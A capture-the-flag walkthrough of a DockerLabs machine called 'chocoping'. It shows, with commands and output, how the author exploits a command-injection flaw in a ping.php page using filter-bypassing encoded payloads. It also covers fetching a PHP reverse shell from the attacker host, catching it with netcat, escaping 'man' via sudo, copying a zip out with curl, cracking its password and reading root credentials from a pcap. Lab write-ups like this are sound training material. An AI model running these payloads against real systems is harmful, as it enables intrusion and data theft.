![Screenshot](/medium/chocoping/images/machine.png)

Difficulty: **medium**

Made by: **el pinguino de mario**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this with the command **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.229 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.130 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.127 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.127/0.162/0.229/0.047 ms
```

Once we see this, we can start the **reconnaissance** phase.

---
# Reconnaissance

We can start our reconnaissance with **nmap** to know what ports are open in the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 23:14 -05
Initiating ARP Ping Scan at 23:14
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 23:14, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:14
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 23:14, 3.84s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000030s latency).
Scanned at 2025-11-21 23:14:05 -05 for 4s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.39 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see here 1 port open, the port 80 (http / hyper-text transfer protocol) 

Let's make another nmap scan to know more about this port:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ nmap -p80 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 23:19 -05
Nmap scan report for 172.17.0.2
Host is up (0.000072s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.0K  2025-04-05 11:13  ping.php
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
```

**-p80**<- With this argument nmap will only scan this port that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

When the scan finish we can see that this port is a directory listening, let's take a look with the browser.

![Screenshot](/medium/chocoping/Images/image1.png)

We see a php file, let's take a look.

![Screenshot](/medium/chocoping/Images/image2.png)

translated it says: **please, enter a valid IP address.**

by intuition we can try to put a random ip address in the url something like this:

![Screenshot](/medium/chocoping/Images/image3.png)

It seems that it uses the command **ping** also this IP address it's my attack machine.

In the machine will execute something like this:

```
???:???:/$ ping <ATTACKER'S MACHINE>
```

We can try to bypass this command and execute commands, we can try various ways like:

- ```ping <ATTACKER'S MACHINE>; id```
- ```ping <ATTACKER'S MACHINE> | id```
- ```ping <ATTACKER'S MACHINE> && id```

Let's try to fuzz the url if we can bypass this command.

But also remember that we need to encode our payload to be url encoded, luckily we can do this directly with **ffuf**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ ffuf -enc 'FUZZ:urlencode' -u 'http://172.17.0.2/ping.php?ip=FUZZ' -w /usr/share/SecLists/command_injection/linux_injections.txt -c -fs 11,21,22
```

When we execute this command we got nothing...

Let's try to put the ; before FUZZ...

![Screenshot](/medium/chocoping/Images/image4.png)

We got two results here, let's take a look with curl if it works:

---
# Exploitation

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ curl -s 'http://172.17.0.2/ping.php?ip=192.168.0.20;%5Ci%5Cd' | html2text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we can see this! we can exploit this RCE vulnerability, but first let's decode the payload what it looks like.

from url decoded converted is this: ```\i\d```

Okay it seems that per each character needs this: \

let's try to execute whoami, with this format and be url encoded.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ curl -s 'http://172.17.0.2/ping.php?ip=192.168.0.20;%5Cw%5Ch%5Co%5Ca%5Cm%5Ci' | html2text
www-data
```

and also it works, let's try to do this with another command, like: ```uname -a``` to know  more about the machine.

But when we add spaces with this kind of format of RCE need's to be a little differrent, something like:

- ```\u\n\a\m\e+\-\a```

The space it's the plus sign but it need to be near to the left character.

Now let's encode it.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ curl -s 'http://172.17.0.2/ping.php?ip=192.168.0.20;%5Cu%5Cn%5Ca%5Cm%5Ce%2B%5C-%5Ca' | html2text
```

But we got nothing here! Im going to try to get back our plus sign, I mean that we are not actually url encode it

The url encoded format of the plus sign is: %2B

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ curl -s 'http://172.17.0.2/ping.php?ip=192.168.0.20;%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca' | html2text
Linux e53d41c4e7af 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1
(2025-09-24) x86_64 GNU/Linux
```

and It works, but it's kinda annoying to write commands on this way, and I made a bash script to do this for us, and run the encoded command directly and show us the output.

![Screenshot](/medium/chocoping/Images/image5.png)

This is a short script but effective Im going to make a diagram to let you understand more easily.

![Screenshot](/medium/chocoping/Images/image6.png)

Okay now let's test it if it works!

![Screenshot](/medium/chocoping/Images/image7.png)

we can see here that it works!

I tried to make a reverse shell directly, but it doesn't work, So I decided to upload a php file to execute it and gain access to the target getting a reverse shell.

![Screenshot](/medium/chocoping/Images/image8.png)

I take this php file from **pentestmonkey** because always work for me.

Once we save the shell.php file let's make a server to download this file from our attack machine to the target machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We make a python server, okay now let's look if **wget** or **curl** is installed on the target machine with our script.

```
web-shell --> which wget
web-shell --> which curl
/usr/bin/curl
```

We can use curl then, now let's download or **shell.php** file.

```
web-shell --> curl http://192.168.0.20/shell.php -o /tmp/shell.php
```

we save our php file to the directory **/tmp/** now let's take a look to the /tmp/ directory  if the php is saved on it.

```
web-shell --> ls -la /tmp
total 12
drwxrwxrwt 1 root     root     4096 Nov 22 19:58 .
drwxr-xr-x 1 root     root     4096 Nov 22 19:38 ..
-rw-r--r-- 1 www-data www-data 2147 Nov 22 19:58 shell.php
```

Okay once we verified that the shell is saved, we can start to listening one port to receive the connection, we can do this with **netcat** 

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay now we are listening to this port, okay so let's execute the script

```
web-shell --> php /tmp/shell.php
```

Now we receive this:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 55872
Linux c88a695fd2b0 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 GNU/Linux
 20:52:21 up  1:25,  0 user,  load average: 2.19, 2.63, 2.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (163): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c88a695fd2b0:/$ whoami
whoami
www-data
```

And finally we are in into the machine.

We can make some treatment of the tty to make this reverse shell more comfortable to work with.

First of all we do this:

```
www-data@c88a695fd2b0:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@c88a695fd2b0:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

---
# Privilege Escalation

Once we execute the command **sudo -l** we can see this:

```
www-data@c88a695fd2b0:/$ sudo -l
Matching Defaults entries for www-data on c88a695fd2b0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on c88a695fd2b0:
    (balutin) NOPASSWD: /usr/bin/man
```

We can run the command **man** as the user **balutin**.

```
www-data@c88a695fd2b0:/$ sudo -u balutin man man
MAN(1)                                          Manual pager utils                                         MAN(1)

NAME

..........

--More--
```

And then we execute the next command:

```
www-data@c88a695fd2b0:/$ sudo -u balutin man man
MAN(1)                                          Manual pager utils                                         MAN(1)

NAME

..........

!/bin/bash
```

And we see this:

```
balutin@c88a695fd2b0:/$ whoami
balutin
```

Now we are as the user **balutin**

And if we move to our home directory we can see this:

```
balutin@c88a695fd2b0:/$ cd
balutin@c88a695fd2b0:~$ ls
secretito.zip
```

We see here a zip file, im going to upload it to my own machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ sudo secureuploads 
[sudo] password for craft: 
[+] The server is up: https://0.0.0.0/SecretUploads
```

I made this tool that can receive files through https.

```
balutin@c88a695fd2b0:~$ curl -k -T secretito.zip https://192.168.0.20/SecretUploads/secretito.zip
```

Now we can see this in our machine: 

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ sudo secureuploads 
[sudo] password for craft: 
[+] The server is up: https://0.0.0.0/SecretUploads 
[+] The file -->secretito.zip<-- was received!
[+] 483 Bytes, Creation: 2025-11-22 17:05:56.370347055 -0500
```

Okay so let's unzip this file.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/chocoping/SecretUploads]
└─$ unzip secretito.zip 
Archive:  secretito.zip
[secretito.zip] traffic.pcap password: 
   skipping: traffic.pcap            incorrect password
```

It needs a password! Then let's capture the hash of this file with **zip2john**

```
┌──(root㉿kali)-[/home/…/dockerlabs/medio/chocoping/SecretUploads]
└─# zip2john secretito.zip > hash
ver 2.0 efh 5455 efh 7875 secretito.zip/traffic.pcap PKZIP Encr: TS_chk, cmplen=293, decmplen=375, crc=04A65EE4 ts=5B18 cs=5b18 type=8
```

Okay now we can do some brute force to know what password uses the zip file.

```
┌──(root㉿kali)-[/home/…/dockerlabs/medio/chocoping/SecretUploads]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (secretito.zip/traffic.pcap)     
1g 0:00:00:00 DONE (2025-11-22 18:32) 2.941g/s 24094p/s 24094c/s 24094C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We can see here that the password of the zip file is: **chocolate**

let's unzip it now.


```
┌──(root㉿kali)-[/home/…/dockerlabs/medio/chocoping/SecretUploads]
└─# unzip secretito.zip 
Archive:  secretito.zip
[secretito.zip] traffic.pcap password: 
  inflating: traffic.pcap
```


We got a pcap file, let's open this file with **wireshark**.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/chocoping/SecretUploads]
└─$ wireshark -r traffic.pcap
```

And we can see this:

![Screenshot](/medium/chocoping/Images/image9.png)

We see the password of the user root, but it isn't...

But also we can see in the same file this:

![Screenshot](/medium/chocoping/Images/image10.png)

we can see the password here: **secretitosecretazo!**

Let's see if it works with the user root.

```
balutin@c88a695fd2b0:~$ su root
Password: 
root@c88a695fd2b0:/home/balutin# whoami
root
```

Now we are root ***...pwned..!***
